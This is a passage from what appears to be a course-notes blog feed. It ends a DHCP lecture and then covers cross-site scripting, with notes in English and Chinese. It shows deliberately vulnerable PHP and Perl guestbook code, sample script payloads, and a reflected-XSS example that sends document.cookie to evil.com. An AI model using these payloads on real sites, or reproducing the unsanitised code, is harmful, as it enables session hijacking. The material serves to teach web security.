&lt;ul&gt;
&lt;li&gt;Scope options – IP settings: default gateway, DNS servers, and other options&lt;/li&gt;
&lt;li&gt;Reservations – an IP address tied to a particular MAC address&lt;/li&gt;
&lt;li&gt;Exclusions – one or more IP addresses excluded from the IP address scope&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;After an address is leased
&lt;ul&gt;
&lt;li&gt;A record of the lease is stored in a database, including a lease expiration time&lt;/li&gt;
&lt;li&gt;When 50% of the lease time has elapsed, the computer attempts to renew the lease from the same DHCP server that originally responded&lt;/li&gt;
&lt;li&gt;If no response, the computer waits until lease is 87.5% expired, a broadcast DHCP renewal request is sent
&lt;ul&gt;
&lt;li&gt;If no response when lease expires, computer broadcasts a DCHP request for a new IP address&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Benefit of using DHCP
&lt;ul&gt;
&lt;li&gt;Computers can easily be moved and requested new IP configuration from a DHCP server on the new segment&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DHCP uses UDP
&lt;ul&gt;
&lt;li&gt;DHCP servers are usually located on the same network and DHCP messages are short&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;
&lt;p&gt;DHCP Process&lt;br&gt;
Broadcast packets used by the DHCP process:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;DHCPDISCOVER – the client announces to the network that it’s looking for a DHCP server&lt;/li&gt;
&lt;li&gt;DHCPOFFER – the server replies and offers the client an IP address for lease&lt;/li&gt;
&lt;li&gt;DHCPREQUEST – the client wants the offered IP address&lt;/li&gt;
&lt;li&gt;DHCPACK – the server acknowledges the transaction and the client can now use the IP address&lt;br&gt;
&lt;img data-src=&#34;https://cdn-fusion.imgcdn.store/i/2024/065a09e3ea0c2cfe.png&#34; alt=&#34;DHCP&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
</content>
        <category term="network system" />
        <category term="HTTP" />
        <category term="DHCP" />
        <category term="DNS" />
        <category term="SSH" />
        <category term="FTP" />
        <category term="SMTP" />
        <updated>2024-11-04T03:27:37.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/course/Cross-Site-attack/</id>
        <title>Cross-Site attack</title>
        <link rel="alternate" href="http://example.com/course/Cross-Site-attack/"/>
        <content type="html">&lt;h1 id=&#34;Cross-Site Scripting&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Cross-Site Scripting&#34;&gt;#&lt;/a&gt;Cross-Site Scripting&lt;/h1&gt;
&lt;h2 id=&#34;XSS&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#XSS&#34;&gt;#&lt;/a&gt;XSS&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Cross-Site Scripting (XSS)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Causes arbitrary code to run in a browser that is connected to a trusted Web site
&lt;ul&gt;
&lt;li&gt;May occur when code returns HTML output that makes use of user inputs&lt;/li&gt;
&lt;li&gt;Trick users into clicking a hyperlink from outside the site&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attacks allows:
&lt;ul&gt;
&lt;li&gt;Disclosure of user files&lt;/li&gt;
&lt;li&gt;Installation of Trojans&lt;/li&gt;
&lt;li&gt;Redirection to other pages&lt;/li&gt;
&lt;li&gt;Trivial theft of cookies&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Basic Problem: Echoing Untrusted User Input&lt;br&gt;
Classic mistake in a server-side application with URL  &lt;code&gt;http://naive.com/search.php?term=justin+bieber&lt;/code&gt; &lt;br&gt;
PHP at search.php responds with&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html&amp;gt;&amp;lt;title&amp;gt;Search results&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   You have searched for &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;lt;?php echo $_GET[&amp;#x27;term&amp;#x27;] ?&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   ...  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在这里， &lt;code&gt;$_GET[&#39;term&#39;]&lt;/code&gt;  的内容直接被嵌入到 HTML 中进行回显。如果  &lt;code&gt;$_GET[&#39;term&#39;]&lt;/code&gt;  包含恶意的 HTML 或 JavaScript 代码，则可能引发跨站脚本攻击 (XSS)。&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Dangerous HTML Inputs&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Boo!&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
 此代码弹出一个警告对话框，证明 XSS 攻击是可能的。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
 此代码会打印当前页面的 Cookie 信息，攻击者可能会窃取用户的会话 Cookie，从而劫持会话。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;document.write(&amp;quot;&amp;lt;br&amp;gt;&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
 此代码会在页面中添加一个  &lt;code&gt;&amp;lt;br&amp;gt;&lt;/code&gt;  标签，显示攻击者可以更改网页内容。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;window.location=&#39;http://google.com&#39;&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
 此代码会将当前网页重定向到另一个页面，使得攻击者可以将用户导向恶意站点&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Main Types of Cross-Site Scripting Attacks
&lt;ol&gt;
&lt;li&gt;Stored (persistent)&lt;/li&gt;
&lt;li&gt;Reflected (non-persistent)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;Stored (Persistent) XSS Attacks&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Stored (Persistent) XSS Attacks&#34;&gt;#&lt;/a&gt;Stored (Persistent) XSS Attacks&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Data supplied by an attacker is &lt;strong&gt;permanently stored&lt;/strong&gt; on a server and displayed to other users when browsing without being properly sanitised&lt;br&gt;
If the user input is displayed in the page
&lt;ul&gt;
&lt;li&gt;HTML tags can mess up the look of the page&lt;/li&gt;
&lt;li&gt;JavaScript can steal information or cause more advanced malicious behaviour&lt;/li&gt;
&lt;li&gt;For the current user or other users&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/67222f628055d.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight perl&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example Vulnerable Guestbook Program&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#!perl&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;comment&#34;&gt;# Fig. 19.6: fig19_06.pl&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;comment&#34;&gt;# Guestbook program.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; warnings;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; strict;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; CGI &lt;span class=&#34;string&#34;&gt;qw( :standard )&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt;( header(), start_html( &lt;span class=&#34;string&#34;&gt;&amp;quot;Guestbook&amp;quot;&lt;/span&gt; ), h1( &lt;span class=&#34;string&#34;&gt;&amp;quot;Guestbook&amp;quot;&lt;/span&gt; ));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( param() ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt; h3( &lt;span class=&#34;string&#34;&gt;&amp;quot;Thank you for signing our guestbook!!!&amp;quot;&lt;/span&gt; ),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt; = param( &lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$email&lt;/span&gt; = param( &lt;span class=&#34;string&#34;&gt;&amp;quot;email&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$message&lt;/span&gt; = param( &lt;span class=&#34;string&#34;&gt;&amp;quot;message&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;open&lt;/span&gt;( FILE, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt;&amp;gt;guestbook.log&amp;quot;&lt;/span&gt; ) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt;   //Open the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;( &lt;span class=&#34;string&#34;&gt;&amp;quot;Cannot open guestbook&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt;( FILE, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, hr(), &lt;span class=&#34;string&#34;&gt;&amp;quot;From: &amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       a( &amp;#123; &lt;span class=&#34;string&#34;&gt;-href =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;mailto:&lt;span class=&#34;variable&#34;&gt;$email&lt;/span&gt;&amp;quot;&lt;/span&gt; &amp;#125;, &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt; ), br(), br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;variable&#34;&gt;$message&lt;/span&gt; );    &lt;span class=&#34;regexp&#34;&gt;//&lt;/span&gt; Store the user entered data in the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;close&lt;/span&gt;( FILE );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;open&lt;/span&gt;( FILE, &lt;span class=&#34;string&#34;&gt;&amp;quot;guestbook.log&amp;quot;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;( &lt;span class=&#34;string&#34;&gt;&amp;quot;Cannot open guestbook&amp;quot;&lt;/span&gt; );   &lt;span class=&#34;regexp&#34;&gt;//&lt;/span&gt;Open the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &amp;lt;FILE&amp;gt; );      &lt;span class=&#34;regexp&#34;&gt;//&lt;/span&gt;Display the contents of the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;close&lt;/span&gt;( FILE );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt;( h4( &lt;span class=&#34;string&#34;&gt;&amp;quot;Please sign our guestbook:&amp;quot;&lt;/span&gt; ), start_form(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;string&#34;&gt;&amp;quot;Name: &amp;quot;&lt;/span&gt;, textfield( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt; ), br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;string&#34;&gt;&amp;quot;E-mail: &amp;quot;&lt;/span&gt;, textfield( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;email&amp;quot;&lt;/span&gt; ), br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;string&#34;&gt;&amp;quot;Enter your message:&amp;quot;&lt;/span&gt;, br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     textarea( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;message&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;-rows =&amp;gt;&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;-columns =&amp;gt;&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;-wrap =&amp;gt;&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; ),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     br(), submit( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Sign the Guestbook&amp;quot;&lt;/span&gt; ), end_form(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     end_html() );&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;该 Perl 脚本是一个基本的访客留言簿程序，允许用户输入姓名、电子邮件和消息并将其保存到日志文件 (guestbook.log) 中。程序还可以读取并显示日志文件的内容&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户输入未过滤：程序直接使用用户输入来生成 HTML 输出和写入日志文件，没有进行任何过滤或转义，容易导致跨站脚本攻击（XSS）。
&lt;ul&gt;
&lt;li&gt;例如，用户在  &lt;code&gt;name&lt;/code&gt;  或  &lt;code&gt;message&lt;/code&gt;  输入字段中插入  &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt; ，这段恶意代码将会在其他用户查看留言簿时被执行。&lt;/li&gt;
&lt;li&gt;或是在留言时插入 HTML 改变页面布局&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;日志文件的可写性：&lt;br&gt;
程序将用户的输入附加到日志文件 guestbook.log，但没有验证文件是否存在或是否已被修改，可能会导致文件篡改或覆盖攻击。&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6722340e28890.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6722340ddbbb1.png&#34; alt=&#34;Image 1&#34;&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6722340b9e2cd.png&#34; alt=&#34;Image 2&#34;&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;/table&gt;
&lt;h2 id=&#34;Reflected (Non-Persistent) XSS Attacks&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Reflected (Non-Persistent) XSS Attacks&#34;&gt;#&lt;/a&gt;Reflected (Non-Persistent) XSS Attacks&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Data supplied by an attacker is displayed in the response page &lt;strong&gt;without being stored on a server&lt;/strong&gt;&lt;br&gt;
If the user input is displayed in the page
&lt;ul&gt;
&lt;li&gt;HTML tags can mess up the look of the page&lt;/li&gt;
&lt;li&gt;JavaScript can steal information or cause more advanced malicious behaviour&lt;/li&gt;
&lt;li&gt;For only the current user&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/672236eb773d1.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;恶意网页（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V2aWwuY29t&#34;&gt;evil.com&lt;/span&gt;）&lt;br&gt;
攻击者在  &lt;code&gt;evil.com&lt;/code&gt;  上创建了一个包含恶意代码的网页。&lt;br&gt;
页面中包含了一个指向目标网站的链接或表单，其中含有恶意的 JavaScript 代码。例如：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://naive.com/hello.cgi?name=&amp;lt;script&amp;gt;win.open(&amp;#x27;http://evil.com/steal.cgi?cookie=&amp;#x27; + document.cookie)&amp;lt;/script&amp;gt;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;链接中的  &lt;code&gt;name&lt;/code&gt;  参数是用来注入 JavaScript 代码的。代码试图将用户的  &lt;code&gt;cookie&lt;/code&gt;  信息发送到攻击者的服务器（即  &lt;code&gt;evil.com&lt;/code&gt;  的  &lt;code&gt;steal.cgi&lt;/code&gt;  脚本）。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;受害者点击了恶意链接并访问了目标网页。&lt;br&gt;
浏览器向 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25haXZlLmNvbQ==&#34;&gt;naive.com&lt;/span&gt; 发送请求，其中包含了恶意的 name 参数。请求的样式为：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable constant_&#34;&gt;GET&lt;/span&gt; /hello.&lt;span class=&#34;property&#34;&gt;cgi&lt;/span&gt;?name=&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;win.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://evil.com/steal.cgi?cookie=&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;cookie&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;目标网站（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25haXZlLmNvbQ==&#34;&gt;naive.com&lt;/span&gt;）&lt;br&gt;
目标网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25haXZlLmNvbQ==&#34;&gt;naive.com&lt;/span&gt; 将用户输入的 name 参数原封不动地嵌入到了响应的 HTML 页面中。响应页面可能是这样：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;HTML&lt;/span&gt;&amp;gt;&lt;/span&gt;Hello, dear &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;win.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://evil.com/steal.cgi?cookie=&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;cookie&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;. Welcome!&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;HTML&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
